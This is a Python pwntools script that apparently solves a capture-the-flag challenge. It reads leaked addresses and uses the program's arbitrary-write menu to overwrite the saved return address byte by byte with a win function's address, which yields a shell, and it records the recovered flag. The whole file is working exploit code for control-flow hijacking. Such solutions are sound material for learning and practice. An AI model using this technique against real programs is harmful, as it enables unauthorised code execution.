from pwn import *

# Connect to the challenge
p =remote('host', port) #change the host and port actual ...

# Get leaked addresses
p.recvuntil(b'choice (pun intended): ')
chc_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'win: ')
win_addr = int(p.recvline().strip(), 16)

log.info(f"Choice variable at: {hex(chc_addr)}")
log.info(f"Win function at: {hex(win_addr)}")

#(0x1c offset from choice)
ret_addr = chc_addr + 0x1c

# Break win address into bytes
win_bytes = p64(win_addr)

# Write each byte of win address to return address location
for i in range(8):
    p.sendlineafter(b'> ', b'2')  # Select write
    p.sendlineafter(b'to in hex:', hex(ret_addr + i).encode())
    p.sendlineafter(b'to:', hex(win_bytes[i]).encode())

# Trigger return by sending invalid option
p.sendlineafter(b'> ', b'3')

# Get the shell
p.interactive()

#Flag: grey{d1D_y0u_3njoY_youR_b4bY_B1tes?}
